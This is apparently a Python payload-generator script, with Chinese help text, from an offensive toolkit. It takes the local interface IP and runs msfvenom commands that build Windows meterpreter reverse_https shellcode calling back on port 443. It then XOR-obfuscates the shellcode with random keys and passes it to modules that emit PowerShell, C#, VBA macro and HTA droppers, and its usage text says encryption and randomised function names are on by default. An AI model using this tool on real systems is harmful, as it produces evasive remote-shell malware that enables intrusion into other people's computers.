#!/usr/bin/python3
import socket
import fcntl
import struct
import sys
import subprocess
import os
import random
import subprocess
import threading
from app.ps1 import generate_ps1
from app.csharp import generate_csharp
from app.vba import generate_vba
from app.hta import generate_hta
from app.note import generate_note

ip_ = ""
xor = ""
rop = ""
shellcodes = {}
lock = threading.Lock()
event = threading.Event()

def test():
    generate_csharp(ip_,shellcodes,(rop,xor))
    input("\033[31m[!]请编译程序,按Enter键继续...\033[0m")
    generthd1 = threading.Thread(target=generate_ps1,args=(ip_,shellcodes))
    generthd3 = threading.Thread(target=generate_vba,args=(ip_,shellcodes,(rop,xor)))
    generthd4 = threading.Thread(target=generate_hta,args=(ip_,shellcodes,(rop,xor)))
    generthd5 = threading.Thread(target=generate_note,args=(ip_,))
    generthd1.start()
    generthd3.start()
    generthd4.start()
    generthd5.start()
    generthd1.join()
    generthd3.join()
    generthd4.join()
    generthd5.join()

    pass


def main():
    global ip_
    check_args(sys.argv)
    ip_ = get_ip_address(sys.argv[1])
    generate_shellcode()
    test()
    pass


def check_args(args):
    if len(args) == 1:
        pass
    elif len(args) >= 1:
        pass
    
    if args[1] == 'help':
        print(usage())
        exit(0)

def check_interface(interface):
    if not os.path.exists('/sys/class/net/' + interface):
        return False    
    output = subprocess.check_output(['ip', 'link', 'show', interface])
    if b'LOWER_UP' not in output:
        return False
    return True

def get_ip_address(ifname):
    if check_interface(ifname) == False:
        print("\033[31m[!]网卡"+ifname+"不存在,尝试使用tun0\033[0m")
        ifname = "tun0"
        if check_interface(ifname) == False:
            print("\033[31m[!]网卡"+ifname+"不存在,退出\033[0m")
            exit(0)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915, # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))
    )[20:24])


def generate_shellcode():


    # hex x64                       0
    # hex x64 thread                1
    # hex x86                       2
    # hex x86 thread                3
    # hex x64           encrypted   4
    # hex x64 thread    encrypted   5
    # hex x86           encrypted   6
    # hex x86 thread    encrypted   7

    commandList = ["msfvenom -p windows/x64/meterpreter/reverse_https LHOST="+ ip_ +" LPORT=443 -f hex ",
                   "msfvenom -p windows/x64/meterpreter/reverse_https LHOST="+ ip_  +" LPORT=443 EXITFUNC=thread -f hex",
                   "msfvenom -p windows/meterpreter/reverse_https LHOST="+ ip_  +" LPORT=443 -f hex",
                   "msfvenom -p windows/meterpreter/reverse_https LHOST="+ ip_  +" LPORT=443 EXITFUNC=thread -f hex"
                   ]
    threads_1 = []
    for i in range(len(commandList)):
        t = threading.Thread(target=invoke_msfvenom,args=(commandList[i],i))
        threads_1.append(t)
        t.start()
    for t in threads_1:
        t.join()

    event.wait()

    global xor,rop
    xor = random.randint(1, 255)
    rop = random.randint(1, 255)
    
    
    for i in range(len(commandList)):
        temp = shellcodes[str(i)]
        encrypt_shellcode(temp)
        pass



 
def encrypt_shellcode(shellcode):
    temp = shellcode.copy()
    for i in range(len(temp)):
        temp[i] = ((temp[i]+rop) & 0xFF)^xor
    shellcodes.update({str(len(shellcodes)):temp})
    


def invoke_msfvenom(command,index):
    # print(index," ",command)
    with subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) as result:
        line = result.stdout.readlines()
    if line[-1].find(b'Error') != -1:
        print("\033[31m[!]"+line[-1].decode('utf-8')+"\033[0m")
        exit(-1)
    # return hexbyte2intarr(line[-1])
    with lock:
        shellcodes.update({str(index):hexbyte2intarr(line[-1])})
    event.set()

def hexbyte2intarr(hexbyte):
    hexstr = hexbyte.decode('utf-8')
    int_array = [int(hexstr[i:i+2], 16) for i in range(0, len(hexstr), 2)]
    return int_array

def banner(): 
    str="""
                   a8                             
                 ,d88                             
                a8P88                             
              ,d8" 88                             
             a8P'  88                             
 gg     gg ,d8"    88     ,ggg,,ggg,     ,gggg,gg 
 I8     8I 888888888888  ,8" "8P" "8,   dP"  "Y8I 
 I8,   ,8I         88    I8   8I   8I  i8'    ,8I 
,d8b, ,d8I         88   ,dP   8I   Yb,,d8,   ,d8I 
P""Y88P"888        88   8P'   8I   `Y8P"Y8888P"888
      ,d8I'                                  ,d8I'
    ,dP'8I                                 ,dP'8I 
   ,8"  8I                                ,8"  8I 
   I8   8I                                I8   8I 
   `8, ,8I                                `8, ,8I 
    `Y8P"                                  `Y8P"     
"""
    return str


def usage():
    str="""
Usage:      Generator.py <网卡>     网卡默认为tun0
Example:    Generator.py eth1
            Generator.py help

Help:       在当前生成目录文件
            所有脚本和其他不需要修改的payload都会生成在out中
            需要手动在VS中编译
            加密默认使用rop+xor 值都是随机生成 函数名也随机生成 

"""
    return str

if __name__ == '__main__':
    main()

